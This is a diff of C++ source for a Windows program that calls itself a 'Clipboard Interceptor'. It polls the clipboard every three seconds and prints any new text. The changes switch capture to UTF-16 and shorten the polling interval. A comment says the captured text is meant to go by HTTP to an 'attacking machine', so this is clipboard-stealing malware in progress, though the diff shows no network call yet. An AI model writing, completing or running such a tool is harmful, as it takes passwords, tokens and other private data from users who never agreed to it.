@@ -3,23 +3,29 @@
 #include <string>
 #include <thread>
 
-std::string GetClipboardText()
+// Console ouput UTF_16 format, TODO REMOVE
+#include <fcntl.h>
+#include <io.h>
+
+// Extracting in UTF_16 format, Windows console could not show it properly
+// TODO test if final result after HTTP call to attacking machine is correctly formatted for all symbols
+std::wstring GetClipboardText()
 {
     if(!OpenClipboard(nullptr))
     {
-        return "Failed. Clipboard is not open.";
+        return L"Failed. Clipboard is not open.";
     }
 
-    HANDLE hData = GetClipboardData(CF_TEXT);
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
 
-    char* textArray = static_cast<char*>(GlobalLock(hData));
+    wchar_t* textArray = static_cast<wchar_t*>(GlobalLock(hData));
     if(textArray == nullptr)
     {
         CloseClipboard();
-        return "Failed. Cannot lock clipboard memory location.";
+        return L"Failed. Cannot lock clipboard memory location.";
     }
 
-    std::string text(textArray);
+    std::wstring text(textArray);
 
     GlobalUnlock(hData);
     CloseClipboard();
@@ -29,19 +35,22 @@ std::string GetClipboardText()
 
 
 int main() {
-    std::cout << "[*] Clipboard Interceptor Started\n";
-    std::string lastClipboard = "";
+    // Console ouput UTF_16 format, TODO REMOVE
+    _setmode(_fileno(stdout), _O_U16TEXT);
+
+    std::wcout << L"[*] Clipboard Interceptor Started\n";
+    std::wstring lastClipboard = L"";
 
     while(true)
     {
-        std::string currentClipboard = GetClipboardText();
+        std::wstring currentClipboard = GetClipboardText();
 
         if(!currentClipboard.empty() && currentClipboard != lastClipboard) {
-            std::cout << "[*] New Clipboard Content:\n\n" << currentClipboard << "\n\n";
+            std::wcout << L"[*] New Clipboard Content:\n\n" << currentClipboard << L"\n\n";
             lastClipboard = currentClipboard;
         }
 
-        std::this_thread::sleep_for(std::chrono::seconds(10));
+        std::this_thread::sleep_for(std::chrono::seconds(3));
     }
 
     return 0;
